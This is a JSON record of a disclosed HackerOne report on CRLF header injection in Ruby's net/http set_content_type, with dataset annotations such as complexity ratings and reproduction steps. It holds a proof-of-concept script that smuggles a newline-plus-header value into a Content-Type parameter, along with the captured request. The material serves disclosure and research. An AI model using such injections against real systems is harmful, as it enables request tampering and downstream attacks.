{
  "reported_to": "Ruby",
  "reported_by": "sighook ",
  "title": "'net/http': HTTP Header Injection in the set_content_type method",
  "content": "\nThe set_content_type's parameter is not filtered to prevent the injection from altering the entire request.\nThe vulnerable code:\nCode 126 Bytes\n1  def set_content_type(type, params = {})\n2    @header['content-type'] = [type + params.map{|k,v|\"; #{k}=#{v}\"}.join('')]\n3  end\nPoC\n\nCode 243 Bytes\n1require 'net/http'\n2\n3uri = URI('http://127.0.0.1:8080')\n4req = Net::HTTP::Post.new(uri)\n5req.set_content_type('text/html', \"charset\" => \"iso-8859-1\\nHeader:Inject\")\n6\n7resp = Net::HTTP.start(uri.hostname, uri.port) do |http|\n8  http.request(req)\n9end\n\nCode 289 Bytes\n1$ nc -lvp 8080\n2Listening on 0.0.0.0 8080\n3Connection received on localhost 57620\n4POST / HTTP/1.1\n5Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\n6Accept: */*\n7User-Agent: Ruby\n8Host: 127.0.0.1:8080\n9Content-Type: text/html; charset=iso-8859-1\n10Header:Inject # <<<<<<<<\n11Content-Length: 0\nI set the same severity as CVE-2020-26116 has.\nImpact\nIn web applications a CRLF injection can have severe impacts, depending on what the application does with single items. Impacts can range from information disclosure to code execution, a direct impact web application security vulnerability.\n\n",
  "severity": [
    7.2,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "CRLF Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1643974260,
  "report_url": "https://hackerone.com/reports/1168205",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a local HTTP server to receive requests: `nc -lvp 8080`"
    ],
    [
      2,
      "Execute the Ruby script that sends a POST request with a malicious Content-Type header containing CRLF injection: `ruby poc.rb`"
    ]
  ],
  "vuln_description": "The vulnerability is an HTTP Header Injection in the `set_content_type` method of the 'net/http' library in Ruby. It allows an attacker to inject arbitrary headers into the HTTP request by including newline characters in the Content-Type parameters. This can lead to various security issues such as HTTP Response Splitting, cache poisoning, or session fixation.",
  "reason": "The vulnerability is straightforward to discover as it involves a simple manipulation of the Content-Type header with CRLF sequences. The attack does not require multiple components or complex application states, and the interaction is obvious once the attacker understands how HTTP headers are constructed.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}